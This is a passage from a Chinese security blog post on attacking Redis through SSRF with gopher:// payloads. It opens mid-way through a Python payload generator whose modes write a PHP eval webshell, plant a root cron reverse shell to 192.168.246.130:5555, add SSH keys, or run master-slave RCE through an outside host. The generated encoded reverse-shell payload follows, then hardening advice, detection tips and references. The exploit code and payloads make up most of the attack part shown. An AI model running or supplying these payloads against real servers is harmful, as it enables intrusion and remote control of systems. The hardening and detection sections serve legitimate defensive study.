        path = <span class="hljs-string">"/var/www/html"</span>
        shell = <span class="hljs-string">"\n\n&lt;?=eval($_GET[0]);?&gt;\n\n"</span>

        cmd = generate_shell(filename, path, passwd, shell)

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">1</span>:
        filename = <span class="hljs-string">"root"</span>
        path = <span class="hljs-string">"/var/spool/cron/"</span>
        shell = <span class="hljs-string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n"</span>

        cmd = generate_reverse(filename, path, passwd, shell.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"^"</span>))

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">2</span>:
        filename = <span class="hljs-string">"authorized_keys"</span>
        path = <span class="hljs-string">"/root/.ssh/"</span>
        pubkey = <span class="hljs-string">"\n\nssh-rsa "</span>

        cmd = generate_sshkey(filename, path, passwd, pubkey.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"^"</span>))

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">3</span>:
        lhost = <span class="hljs-string">"124.220.233.26"</span>
        lport = <span class="hljs-string">"5555"</span>
        command = <span class="hljs-string">"ls /"</span>

        cmd = generate_rce(lhost, lport, passwd, command)

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">31</span>:
        cmd = rce_cleanup()

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">4</span>:
        cmd = generate_info(passwd)

    protocol = <span class="hljs-string">"gopher://"</span>

    ip = <span class="hljs-string">"0.0.0.0"</span>
    port = <span class="hljs-string">"6379"</span>

    payload = protocol + ip + <span class="hljs-string">":"</span> + port + <span class="hljs-string">"/_"</span>

    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += quote(quote(redis_format(x).replace(<span class="hljs-string">"^"</span>, <span class="hljs-string">" "</span>)))
    <span class="hljs-keyword">return</span> payload


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># 0 for webshell ; 1 for re shell ; 2 for ssh key ;</span>
    <span class="hljs-comment"># 3 for redis rce ; 31 for rce clean up</span>
    <span class="hljs-comment"># 4 for info</span>
    <span class="hljs-comment"># suggest cleaning up when mode 3 used</span>
    mode = <span class="hljs-number">1</span>

    <span class="hljs-comment"># input auth passwd or leave blank for no pw</span>
    passwd = <span class="hljs-string">''</span>

    p = generate_payload(passwd, mode)
    <span class="hljs-built_in">print</span>(p)</code></pre>
<p>选择模式1，这里只需要一次编码即可</p>
<pre><code class="hljs plaintext">aaa%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2461%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/5555%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0Aaaa</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231160714720.png" alt="image-20231231160714720"></p>
<p>如上图成功反弹shell，这里有点懵逼的是，我看那些师傅都在payload前后加个aaa的无用字符，不知道为何，我这里删除之后测试，依旧可以反弹shell。。。搜了多个文章也无果，希望日后可以解惑吧</p>
<pre><code class="hljs scss">docker exec -it <span class="hljs-number">4</span>cfd33d77a1c ip addr</code></pre>
<p>这里我们可以通过上述命令来得知docker容器的ip地址。</p>
<h1 id="0x07-修复建议">0x07 修复建议</h1>
<p>① Redis设置访问白名单(入 防止恶意访问和出 防止恶意设置为主从)</p>
<p>② Redis添加认证</p>
<pre><code class="hljs plaintext">在配置文件/etc/redis/redis.conf中修改requirepasss属性为强口令，完成后重启服务器

动态命令设置config set requirepass YorPass</code></pre>
<p>③ 重命名相关命令</p>
<pre><code class="hljs plaintext">在配置文件/etc/redis/redis.conf中

rename-command CONFIG PDZA1DA也可以rename-command CONFIG "" 设置为空来禁用</code></pre>
<p>对于恶意特征，可以通过MODULE LIST命令查看当前加载的模块信息，重点关注非官方加载或者SYSTEM、EXEC等恶意关键词，监控Redis服务器上Redis进程写入的so文件（Windows为DLL文件），流量中可以重点关注FULLRESYNC命令以及相关文件二进制特征（Webshell，Cron，Authorized_keys，so和DLL等）。</p>
<h1 id="0x08-知识总结">0x08 知识总结</h1>
<h2 id="dict协议使用注意事项">Dict协议使用注意事项</h2>
<ol>
<li>Dict协议中可以用:代替空格</li>
<li>?会截断后面的内容(写马的情况下要想办法bypass “?”)</li>
<li>dict协议一次只能发送一条数据</li>
</ol>
<h2 id="crontab写入tips">crontab写入Tips</h2>
<ul>
<li><code>/etc/crontab</code></li>
<li><code>/etc/cron.d/*</code>：将任意文件写到该目录下，效果和crontab相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹shell；</li>
<li><code>/var/spool/cron/root</code>：CentOS系统下root用户的cron文件；</li>
<li><code>/var/spool/cron/crontabs/root</code>：Debian系统下root用户的cron文件；</li>
</ul>
<h1 id="0x09-参考文章">0x09 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://inhann.top/2021/09/14/redis_master_slave_rce/">redis 主从复制 RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665#toc-2">浅析Redis中SSRF的利用</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/325035.html">Redis主从复制RCE影响分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">服务端请求伪造（SSRF）之Redis篇</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/X5-cJtF2RC0AkoYH-PdihA">SSRF+Redis</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263556.html">利用SSRF攻击内网Redis服务</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">服务端请求伪造（SSRF）之Redis篇</a></p>
<p><a target="_blank" rel="noopener" href="http://www.cdcxht.com/News_read_id_178.shtml">Redis主从复制RCE分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/293030.html">很经典的一道CTF-WriteUP[网鼎杯 2020 玄武组]SSRFMe</a></p>
<p><a target="_blank" rel="noopener" href="https://pino-hd.github.io/2018/06/19/%E5%88%A9%E7%94%A8WebLogic-SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis%E5%8F%8D%E5%BC%B9shell/">利用WebLogic SSRF漏洞攻击内网Redis反弹shell</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ah67tLoL8EyjgH6RBumNYw">SSRF中Redis的利用</a></p>
<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/weblogic-ssrf%EF%BC%88cve-2014-4210%EF%BC%89/">WebLogic SSRF（CVE-2014-4210）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ajsafe.com/news/180.html">SSRF——weblogic vulhub 漏洞复现及攻击内网redis（一）（附批量检测脚本）</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/12/27/ssrf-da-redis/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/12/27/ssrf-da-redis/')">ssrf打redis</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/12/27/ssrf-da-redis/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=ssrf打redis&amp;url=http://hybcx.xyz/2023/12/27/ssrf-da-redis/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>基础知识<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/25/open-basedir-wakeup-rao-guo/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">open_basedir+wake_up绕过总结</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">渗透测试流程&amp;外网打点</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ssrf%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 SSRF介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">0x03 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#resp%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.1.</span> <span class="toc-text">RESP协议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8Cssrf"><span class="toc-number">4.</span> <span class="toc-text">0x04 Redis配合gopher协议进行SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.</span> <span class="toc-text">redis认证攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AF%86%E7%A0%81redis%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.1.</span> <span class="toc-text">无密码Redis攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%AF%86%E7%A0%81redis%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.2.</span> <span class="toc-text">有密码Redis攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%86%99webshell"><span class="toc-number">4.5.</span> <span class="toc-text">绝对路径写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">4.5.1.</span> <span class="toc-text">构造payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-number">4.6.</span> <span class="toc-text">写ssh公钥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E6%9C%BA%E5%85%AC%E9%92%A5"><span class="toc-number">4.6.1.</span> <span class="toc-text">生成攻击机公钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8contrab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.7.</span> <span class="toc-text">利用contrab计划任务反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">4.7.1.</span> <span class="toc-text">构造payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce"><span class="toc-number">5.</span> <span class="toc-text">0x05 Redis主从复制RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">5.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">5.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%A6%82%E5%BF%B5"><span class="toc-number">5.3.</span> <span class="toc-text">主从复制概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis-module"><span class="toc-number">5.4.</span> <span class="toc-text">redis module</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">5.5.</span> <span class="toc-text">攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">5.5.1.</span> <span class="toc-text">全量复制的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E9%83%A8%E5%88%86%E5%A4%8D%E5%88%B6"><span class="toc-number">5.5.2.</span> <span class="toc-text">增量复制（部分复制）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">5.6.</span> <span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">5.6.1.</span> <span class="toc-text">任意文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8Fso"><span class="toc-number">5.6.2.</span> <span class="toc-text">redis加载恶意.so</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E8%BF%9B%E8%A1%8Credis%E5%8A%A0%E8%BD%BDso"><span class="toc-number">5.6.3.</span> <span class="toc-text">SSRF进行redis加载.so</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">5.7.</span> <span class="toc-text">痕迹清除</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98"><span class="toc-number">6.</span> <span class="toc-text">0x06 题目实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfhub-ssrf-redis%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.1.</span> <span class="toc-text">CTFHUB-SSRF-redis协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis-4x5x%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce"><span class="toc-number">6.2.</span> <span class="toc-text">Redis 4.x&#x2F;5.x主从复制RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme"><span class="toc-number">6.3.</span> <span class="toc-text">[网鼎杯 2020 玄武组]SSRFMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weblogic-ssrf%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.4.</span> <span class="toc-text">Weblogic SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">6.4.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.4.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">7.</span> <span class="toc-text">0x07 修复建议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">0x08 知识总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">8.1.</span> <span class="toc-text">Dict协议使用注意事项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crontab%E5%86%99%E5%85%A5tips"><span class="toc-number">8.2.</span> <span class="toc-text">crontab写入Tips</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">9.</span> <span class="toc-text">0x09 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a 